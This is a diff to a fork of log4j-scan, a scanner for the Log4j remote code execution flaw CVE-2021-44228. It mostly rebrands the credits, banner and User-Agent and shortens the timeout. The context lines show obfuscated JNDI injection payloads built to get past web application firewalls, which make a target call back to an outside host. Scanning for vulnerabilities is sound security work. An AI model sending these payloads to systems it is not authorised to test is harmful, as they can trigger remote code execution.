@@ -2,10 +2,8 @@
 # coding=utf-8
 # ******************************************************************
 # log4j-scan: A generic scanner for Apache log4j RCE CVE-2021-44228
-# Author:
-# Mazin Ahmed <Mazin at FullHunt.io>
-# Scanner provided by FullHunt.io - The Next-Gen Attack Surface Management Platform.
-# Secure your Attack Surface with FullHunt.io.
+# Forked Author: @d4rkm0de (Bryan Smith)
+# Credit: Mazin Ahmed <Mazin at FullHunt.io>
 # ******************************************************************
 
 import argparse
@@ -34,8 +32,9 @@ except Exception:
 
 
 cprint('[•] CVE-2021-44228 - Apache Log4j RCE Scanner', "green")
-cprint('[•] Scanner provided by FullHunt.io - The Next-Gen Attack Surface Management Platform.', "yellow")
-cprint('[•] Secure your External Attack Surface with FullHunt.io.', "yellow")
+cprint('[•] Forked Scanner by Redline Cyber Security', "yellow")
+cprint('[•] By: Bryan Smith (@d4rkm0de)', "yellow")
+cprint('[•] Credit: Mazin Ahmed', "yellow")
 
 if len(sys.argv) <= 1:
     print('\n%s -h for help.' % (sys.argv[0]))
@@ -43,12 +42,12 @@ if len(sys.argv) <= 1:
 
 
 default_headers = {
-    'User-Agent': 'log4j-scan (https://github.com/mazen160/log4j-scan)',
+    'User-Agent': 'log4j-scan (https://www.redlinecybersecurity.com)',
     # 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36',
     'Accept': '*/*'  # not being tested to allow passing through checks on Accept header in older web-servers
 }
 post_data_parameters = ["username", "user", "email", "email_address", "password"]
-timeout = 4
+timeout = 1 #Fast Timeout for attempts
 
 waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{callback_host}}/{{random}}}",
                        "${${::-j}ndi:rmi://{{callback_host}}/{{random}}}",
@@ -374,7 +373,7 @@ def main():
     time.sleep(int(args.wait_time))
     records = dns_callback.pull_logs()
     if len(records) == 0:
-        cprint("[•] Targets does not seem to be vulnerable.", "green")
+        cprint("[•] Target(s) do not seem to be vulnerable.", "green")
     else:
         cprint("[!!!] Target Affected", "yellow")
         for i in records:
